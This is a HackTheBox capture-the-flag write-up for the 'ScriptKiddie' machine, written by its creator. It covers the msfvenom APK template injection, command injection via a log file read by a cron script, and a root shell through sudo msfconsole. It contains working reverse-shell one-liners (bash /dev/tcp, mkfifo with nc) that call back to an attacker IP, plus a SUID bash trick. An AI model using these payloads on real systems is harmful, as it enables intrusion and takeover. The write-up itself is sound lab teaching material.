---
title: HTB: ScriptKiddie
url: https://0xdf.gitlab.io/2021/06/05/htb-scriptkiddie.html
date: 2021-06-05T09:00:00+00:00
difficulty: Easy [20]
os: Linux
tags: ctf, htb-scriptkiddie, hackthebox, nmap, searchsploit, msfvenom, cve-2020-7384, msfconsole, command-injection, injection, incron, irb, oscp-like-v2
---

![ScriptKiddie](https://0xdfimages.gitlab.io/img/scriptkiddie-cover.png)

ScriptKiddie was the third box I wrote that has gone live on the HackTheBox platform. From the time I first heard about the command injection vulnerability in msfvenom, I wanted to make a box themed around a novice hacker and try to incorporate it. To own this box, I’ll find the website which has a few tools for a hacker might use, including an option to have msfvenon create a payload. I’ll upload a malicious template and get code execution on the box. From there, I’ll exploit a cron with another command injection to reach the next user. Finally, to root, I’ll abuse the sudo rights of that user to run msfconsole as root, and use the built in shell commands to get a root shell. In Beyond Root, a look at some of the automations I put in place for the box.

## Box Info

| Name | [ScriptKiddie](https://hackthebox.com/machines/scriptkiddie)  [ScriptKiddie](https://hackthebox.com/machines/scriptkiddie) [Play on HackTheBox](https://hackthebox.com/machines/scriptkiddie) |
| --- | --- |
| Release Date | [06 Feb 2021](https://twitter.com/hackthebox_eu/status/1357366014305009673) |
| Retire Date | 05 Jun 2021 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for ScriptKiddie |
| Radar Graph | Radar chart for ScriptKiddie |
| First Blood User | 00:21:31[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 00:31:50[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [0xdf 0xdf](https://app.hackthebox.com/users/4935) |

## Recon

### nmap

`nmap` finds two open ports, TCP 22 (SSH) and 5000 (HTTP over Python):

```

oxdf@parrot$ sudo nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.226
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-28 13:14 EDT
Nmap scan report for 10.10.10.226
Host is up (0.17s latency).
Not shown: 65519 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
5000/tcp  open     upnp

Nmap done: 1 IP address (1 host up) scanned in 32.80 seconds

oxdf@parrot$ nmap -p 22,5000 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.226
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-28 12:05 EDT
Nmap scan report for 10.10.10.226
Host is up (0.21s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.34 seconds

```

### HTTP - TCP 5000

The site is for kids hacker tools:

![image-20210105155912077](https://0xdfimages.gitlab.io/img/image-20210105155912077.png)

There are three sections. The first takes an IP and runs `nmap` against it. On scanning localhost, it seems to work:

[![image-20210105161047151](https://0xdfimages.gitlab.io/img/image-20210105161047151.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210105161047151.png)

The payloads section allows me to select from windows / linux / android, provide an lhost ip, and and option template file. Based on the text, I can assume that these are arguments passed to `msfvenom` to generate a payload. On success, it returns the payload, which is downloadable. The link seems to work for the next five minutes:

[![image-20210105161154652](https://0xdfimages.gitlab.io/img/image-20210105161154652.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210105161154652.png)

The sploits section runs the input against `searchsploit` and shows the results:

[![image-20210105161800737](https://0xdfimages.gitlab.io/img/image-20210105161800737.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210105161800737.png)

Given that all three of these seem to be running binaries from a Linux system, I’ll try command injection in each input, but without luck. Any non-alphanumeric characters in the searchsploit box lead to this warning:

![image-20210528122728509](https://0xdfimages.gitlab.io/img/image-20210528122728509.png)

## Shell as kid

### CVE-2020-7384 Background

The version of metasploit on the box is 6.0.9, which is vulnerable to [CVE-2020-7384](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md). I can use the `searchsploit` command line or through the website to find this vulnerability:

![image-20210528121353306](https://0xdfimages.gitlab.io/img/image-20210528121353306.png)

I actually worked with ExploitDB to get them to add this vulnerability to their database so that it would show up for this box. The vulnerability is a command injection in the way that `msfvenom` handles an APK template file. The idea of the template file is that you can pass `msfvenom` a legit `.exe` or `.apk`, and it will try to build a malicious file into that file while preserving the intended capability. This functionality allows for attackers to hide behind the legit functionality.

### Build Payload

There’s also a metasploit exploit for this vulnerability which I found more reliable than the Python script:

```

oxdf@parrot$ msfconsole
...[snip]...
msf6 > search msfvenom

Matching Modules
================

   #  Name                                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                                    ---------------  ----       -----  -----------
   0  exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection  2020-10-29       excellent  No     Rapid7 Metasploit Framework msfvenom APK Template Command Injection

Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) >

```

The default options work, so I’ll just set my host and port:

```

msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set LHOST 10.10.14.15
LHOST => 10.10.14.15
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set LPORT 443
LPORT => 443
msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > options

Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.apk          yes       The APK file name

Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  443              yes       The listen port
   **DisablePayloadHandler: True   (no handler will be created!)**

Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

Running it creates an `.apk` file:

```

msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

[+] msf.apk stored at /home/oxdf/.msf4/local/msf.apk

```

### Exploit

If I wanted to catch this shell with `msfconsole`, I could start up an `exploit/multi/handler`, but because the payload is an unstaged shell, I can also use `nc`. I’ll start a `nc` listener on TCP 443 using `nc -lnvp 443`. Then I’ll upload the APK to the site:

![image-20210528122202222](https://0xdfimages.gitlab.io/img/image-20210528122202222.png)

After a few seconds, the site returns an error:

![image-20210105162443427](https://0xdfimages.gitlab.io/img/image-20210105162443427.png)

But there’s shell at `nc`:

```

oxdf@parrot$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.226] 52132 

```

The shell returns with no prompt, but if I enter Linux commands (like `id`) and hit enter, they execute:

```

id
uid=1000(kid) gid=1000(kid) groups=1000(kid)

```

The shell is running as the kid user. I’ll upgrade my shell using Python to get a TTY:

```

python3 -c 'import pty;pty.spawn("bash")'
kid@scriptkiddie:~/.ssh$ ^Z
[1]+  Stopped                 nc -lvnp 443
oxdf@parrot$ stty raw -echo; fg
nc -lvnp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
kid@scriptkiddie:~/.ssh$

```

I can grab `user.txt`:

```

kid@scriptkiddie:~$ cat user.txt
4cbc14d5************************

```

I could also write a public SSH key into `/home/kid/.ssh/authorized_keys`, and then SSH into ScriptKiddie.

## Shell as pwn

### Enumeration

#### kid’s Homedir

The code for the website is a Python app in `/home/kid/html`:

```

kid@scriptkiddie:~/html$ ls
__pycache__  app.py  static  templates

```

I noted above when looking for command injection vulnerabilities in the site that it threatened to “hack me back”. As kid, I can take a look at the code:

```

def searchsploit(text, srcip):
    if regex_alphanum.match(text):
        result = subprocess.check_output(['searchsploit', '--color', text])
        return render_template('index.html', searchsploit=result.decode('UTF-8', 'ignore'))
    else:
        with open('/home/kid/logs/hackers', 'a') as f:
            f.write(f'[{datetime.datetime.now()}] {srcip}\n')
        return render_template('index.html', sserror="stop hacking me - well hack you back")

```

`regex_alphanum` is defined at the top of the file to do just what it sounds like:

```

regex_alphanum = re.compile(r'^[A-Za-z0-9 \.]+$')

```

It will match a string that contains only alphnumeric characters plus space and period. If anything is submitted that doesn’t match that, it writes the name and source IP into a file, `/home/kid/logs/hackers`.

I can look at that format of that line using the Python shell:

```

oxdf@parrot$ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import datetime
>>> srcip = "10.10.14.15"
>>> f'[{datetime.datetime.now()}] {srcip}\n'
'[2021-05-28 12:37:32.655374] 10.10.14.15\n'

```

In the `logs` dir, the `hackers` file is empty:

```

kid@scriptkiddie:~/logs$ wc -l hackers 
0 hackers

```

I can trigger the log, or write to it myself, but it immediately empties. I can show this by sending a single line that writes to the log, then cats the log, then sleeps, then cats the log again:

```

kid@scriptkiddie:~/logs$ echo "[2021-05-28 12:37:32.655374] 10.10.14.15" > hackers; cat hackers; echo sleep; sleep 1; cat hackers; echo done
[2021-05-28 12:37:32.655374] 10.10.14.15
sleep
done

```

It’s there, but then it’s not.

#### pwn’s Homedir

Looking at the other user, pwn, as kid I can see a file and a directory in the other user’s (pwn) homedir:

```

kid@scriptkiddie:/home/pwn$ ls -l
total 8
drwxrw---- 2 pwn pwn 4096 May 28 16:30 recon
-rwxrwxr-- 1 pwn pwn  250 Jan 28 17:57 scanlosers.sh

```

I can’t access the `recon` directory, but I can read `scanlosers.sh`:

```

#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi

```

The script is taking the logs from the webapp, using `cut` and `sort` to get a unique list of IPs, and then looping over them and running `nmap` to scan the top 10 ports on that IP, saving it in the `recon` folder. Then it clears the log.

That seems to be running each time something is written to the `hackers` file, as the log clears immediately (I’ll show how in [Beyond Root](#incron)). Knowing how that’s being read, I’ll drop a log into the `hackers` file again, this time with tcpdump running on my host:

```

kid@scriptkiddie:~/logs$ echo "[2021-05-28 12:37:32.655374] 10.10.14.15" > hackers

```

At `tcpdump`, I see 10 ports being scanned:

```

oxdf@parrot$ sudo tcpdump -i tun0 not port 443
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:41:37.918900 IP 10.10.10.226.33000 > 10.10.14.15.http: Flags [S], seq 1530446456, win 64240, options [mss 1357,sackOK,TS val 2988937361 ecr 0,nop,wscale 7], length 0
12:41:37.918911 IP 10.10.14.15.http > 10.10.10.226.33000: Flags [R.], seq 0, ack 1530446457, win 0, length 0
12:41:37.942751 IP 10.10.10.226.33380 > 10.10.14.15.pop3: Flags [S], seq 1475375272, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
12:41:37.942824 IP 10.10.14.15.pop3 > 10.10.10.226.33380: Flags [R.], seq 0, ack 1475375273, win 0, length 0
12:41:37.942863 IP 10.10.10.226.53306 > 10.10.14.15.netbios-ssn: Flags [S], seq 454771846, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
12:41:37.942888 IP 10.10.14.15.netbios-ssn > 10.10.10.226.53306: Flags [R.], seq 0, ack 454771847, win 0, length 0
12:41:37.942913 IP 10.10.10.226.50822 > 10.10.14.15.ftp: Flags [S], seq 501567112, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
12:41:37.942933 IP 10.10.14.15.ftp > 10.10.10.226.50822: Flags [R.], seq 0, ack 501567113, win 0, length 0
12:41:37.942956 IP 10.10.10.226.42776 > 10.10.14.15.smtp: Flags [S], seq 931967393, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
12:41:37.942975 IP 10.10.14.15.smtp > 10.10.10.226.42776: Flags [R.], seq 0, ack 931967394, win 0, length 0
12:41:37.942997 IP 10.10.10.226.36042 > 10.10.14.15.ms-wbt-server: Flags [S], seq 2803715103, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
12:41:37.943016 IP 10.10.14.15.ms-wbt-server > 10.10.10.226.36042: Flags [R.], seq 0, ack 2803715104, win 0, length 0
12:41:37.943041 IP 10.10.10.226.33926 > 10.10.14.15.telnet: Flags [S], seq 2868964441, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
12:41:37.943060 IP 10.10.14.15.telnet > 10.10.10.226.33926: Flags [R.], seq 0, ack 2868964442, win 0, length 0
12:41:37.943083 IP 10.10.10.226.43864 > 10.10.14.15.microsoft-ds: Flags [S], seq 899346322, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
12:41:37.943101 IP 10.10.14.15.microsoft-ds > 10.10.10.226.43864: Flags [R.], seq 0, ack 899346323, win 0, length 0
12:41:37.943166 IP 10.10.10.226.33020 > 10.10.14.15.http: Flags [S], seq 247415536, win 64240, options [mss 1357,sackOK,TS val 2988937385 ecr 0,nop,wscale 7], length 0
12:41:37.943184 IP 10.10.14.15.http > 10.10.10.226.33020: Flags [R.], seq 0, ack 247415537, win 0, length 0

```

So it’s clear that script is running.

### Command Injection

#### POC

The script is also injectable. Each line of the log is going to go into `cut` to select the third and beyond objects (`-f3-`) when separated by space (`-d' '`). Then it will `sort -u` to remove duplicates. This isolates the IP:

```

kid@scriptkiddie:~/logs$ echo "[2021-05-28 12:37:32.655374] 10.10.14.15" | cut -d' ' -f3-
10.10.14.15

```

Then for each IP, it will run:

```

sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &

```

So if I can put more than just an IP into the file where the IP should be, I can inject commands. For example, I’ll use a payload like

```

kid@scriptkiddie:~/logs$ echo "x x x 127.0.0.1; ping -c 1 10.10.14.15 #" | cut -d' ' -f3- 
x 127.0.0.1; ping -c 1 10.10.14.15 #

```

The first two `x` are just cut out, so that payload starts after that. The next `x` is the name of the file in `/recon`. Then I put a 127.0.0.1 so it would have something to scan. Then there’s a `;` to start a new command, which I’ll start with `ping`. Then a `#` to comment out the rest of the line. That would make:

```

sh -c "nmap --top-ports 10 -oN recon/x 127.0.0.1; ping -c 1 10.10.14.15 #.nmap x 127.0.0.1; ping -c 1 10.10.14.15 # 2>&1 >/dev/null" &

```

With syntax highlighting on the part inside `sh -c ""`:

```

nmap --top-ports 10 -oN recon/x 127.0.0.1; ping -c 1 10.10.14.15 #.nmap x 127.0.0.1; ping -c 1 10.10.14.15 # 2>&1 >/dev/null

```

It’s clearly going to `nmap` and then `ping`.

I’ll start `tcpdump` and put that into the log:

```

kid@scriptkiddie:~/logs$ echo "x x x 127.0.0.1; ping -c 1 10.10.14.15 #"  > hackers

```

Immediately there’s ICMP at `tcpdump`:

```

oxdf@parrot$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:50:17.736260 IP 10.10.10.226 > 10.10.14.15: ICMP echo request, id 1, seq 1, length 64
12:50:17.736296 IP 10.10.14.15 > 10.10.10.226: ICMP echo reply, id 1, seq 1, length 64

```

#### Shell

With command injection verified, I’ll update the payload from a `ping` to a reverse shell. I could also do things like writes a SSH key or make a SUID copy of `sh`.

I’ll write this payload with a reverse shell to the logs:

```

kid@scriptkiddie:~/logs$ echo "x x x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1' # ."  > hackers

```

Immediately at `nc` there’s a connection:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.226] 52532
bash: cannot set terminal process group (873): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$

```

Same shell upgrade for command history:

```

pwn@scriptkiddie:~$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
pwn@scriptkiddie:~$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
pwn@scriptkiddie:~$ 

```

#### Common Issues

A lot of people I saw getting stuck on this step didn’t take into account the `cut`, or read it incorrectly. If you tried to just pass a reverse shell in without some spacing, then it would lead to weird results. For example, if you tried to pass:

```

; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.15/443 0>&1' #

```

That would create:

```

nmap --top-ports 10 -oN recon/-c '/bin/bash -i >& /dev/tcp/10.10.14.15/443 0>&1' #.nmap -c '/bin/bash -i >& /dev/tcp/10.10.14.15/443 0>&1' # 2>&1 >/dev/null

```

That’s going to try to scan `'/bin/bash -i >& /dev/tcp/10.10.14.15/443 0>&1'`, which is not going to resolve.

On the other hand, the Bash pipe shell will have some weird results:

```

; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.10.14.15 443 > /tmp/f #

```

Passing that into `cut` gives a result:

```

oxdf@parrot$ echo '; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.10.14.15 443 > /tmp/f #' | cut -d' ' -f3-
/tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.10.14.15 443 > /tmp/f #

```

That will inject into the command to be:

```

nmap --top-ports 10 -oN recon//tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.10.14.15 443 > /tmp/f #.nmap /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc 10.10.14.15 443 > /tmp/f # 2>&1 >/dev/null

```

That might actually work, just as a lucky result of what gets cut.

Another issues I saw was people forgetting to comment out the rest of the line. So take the payload I used without the comment:

```

oxdf@parrot$ echo "x x x 127.0.0.1; ping -c 1 10.10.14.15" | cut -d' ' -f3-
x 127.0.0.1; ping -c 1 10.10.14.15

```

That creates:

```

nmap --top-ports 10 -oN recon/x 127.0.0.1; ping -c 1 10.10.14.15.nmap x 127.0.0.1; ping -c 1 10.10.14.15 2>&1 >/dev/null

```

The first `ping` will fail because `10.10.14.15.nmap` is not a valid ip. But the second will work, but the output will be all piped to `/dev/null`. A rev shell will get more messed up:

```

oxdf@parrot$ echo "x x x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'" | cut -d' ' -f3-
x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'

```

Becomes:

```

nmap --top-ports 10 -oN recon/x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'.nmap x 127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1' 2>&1 >/dev/null

```

The first `bash` call will connect back, but then fail because of the `.nmap`. The second would actually work, if you are quick enough to have the `nc` listener receive the first connection, start listening again, and then get the second. Something like `for i in {1..2}; do nc -lvnp 443; done` will work.

## Shell as root

### Enumeration

The first thing I typically check is `sudo`, and it pays off again, as pwn can run `msfconsole` with `sudo` as root without a password:

```

pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole

```

### Shell

On running that, I’ve got a Metasploit terminal as root:

```

pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole
...[snip]...
msf6 >

```

One way to get a shell from here is to drop to the integrated Ruby shell, `irb`:

```

msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> 

```

From there, I can run `system` to run arbitrary commands. One way is to copy `bash` and set it SUID:

```

>> system("cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf")
=> true

```

Now that will give a root shell:

```

kid@scriptkiddie:~$ /tmp/0xdf -p
0xdf-5.0# id
uid=1000(kid) gid=1000(kid) euid=0(root) groups=1000(kid)

```

Even simpler, I could run `system("bash")` from `irb`:

```

>> system("bash")
root@scriptkiddie:/home/pwn#

```

Simpler yet, I can run terminal commands from the MSF prompt:

```

msf6 > bash                                                                    
[*] exec: bash

root@scriptkiddie:/home/pwn#

```

Regardless of the method, I can now grab `root.txt`:

```

0xdf-5.0# cat /root/root.txt
b2b48d52************************

```

## Beyond Root

### InCron

There are also two `incron` tasks running as pwn, stored in `/var/spool/incron/pwn`:

```

/home/pwn/recon/        IN_CLOSE_WRITE  sed -i 's/open  /closed/g' "$@$#"
/home/kid/logs/hackers  IN_CLOSE_WRITE   /home/pwn/scanlosers.sh

```

`incron`, from iNotify cron, is a service which will watch for different kinds of filesystem events and trigger actions based on them. So for example, the first line above. It is looking at the `/home/pwn/recon` folder, and triggering on `IN_CLOSE_WRITE` events. Whenever there’s a write event in that folder, it will run `sed`. This line is a cleanup mechanism. It will take all the scan data written to `/home/pwn/recon` and replace `open` with closed. This was just being careful not to leave scans of players machines laying around on the host. Any ports found open would still show closed.

The second is a trigger for the first step of privesc. It looks for write events to the `hackers` file, and then runs `scanlosers.sh` as pwn. That’s how the job managed to trigger immediately on log generation.

### Filtering

The webpage takes an IP address and will nmap scan that IP. to prevent players from scanning other players in their network, I set it such that it would only scan the players own IP and other HTB machines with this logic:

```

def scan(ip):
    if regex_ip.match(ip):
        if not ip == request.remote_addr and ip.startswith('10.10.1') and not ip.startswith('10.10.10.'):
            stime = random.randint(200,400)/100
            time.sleep(stime)
            result = f"""Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-02 13:36 UTC\nNote: Host seems down. If it is really up, but blocking our ping probes, try -Pn\nNmap done: 1 IP address (0 hosts up) scanned in {stime} seconds""".encode()
        else:
            result = subprocess.check_output(['nmap', '--top-ports', '100', ip])
        return render_template('index.html', scan=result.decode('UTF-8', 'ignore'))

```

Basically, the given IP isn’t the users own IP and it starts with 10.10.1 but not 10.10.10 (to allow players to scan other HTB machines), then it uses static `nmap` output saying the host is down. It picks a random scan time between 2 and 4 seconds, and adds a sleep of that time for the right feel.